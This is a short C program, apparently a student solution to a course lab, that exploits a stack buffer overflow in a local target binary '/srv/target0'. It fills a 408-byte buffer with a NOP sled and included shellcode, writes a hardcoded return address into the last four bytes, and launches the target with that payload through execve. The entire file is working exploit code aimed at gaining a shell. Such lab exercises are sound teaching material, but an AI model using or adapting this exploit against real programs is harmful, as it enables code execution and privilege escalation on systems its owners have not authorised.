#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

const char* TARGET = "/srv/target0";

const int PAYLOADSIZE = 408;
const int SHELLCODESIZE = sizeof(shellcode) - 1;
const uint32_t RETADDR = 0xffffdb2c;

void prepPayload(char *payload) {
    memset(payload, 0x90, PAYLOADSIZE);
    payload[PAYLOADSIZE] = '\0';
    memcpy(payload, shellcode, SHELLCODESIZE);
    *(uint32_t*)(payload + PAYLOADSIZE - 4) = RETADDR;
}

int main(void)
{
    char *args[3];
    char *env[1];
    char payload[PAYLOADSIZE + 1];

    prepPayload(payload);

    args[0] = TARGET;
    args[1] = payload;
    args[2] = NULL;

    env[0] = NULL;

    execve(TARGET, args, env);
    fprintf(stderr, "execve failed.\n");

    return 0;
}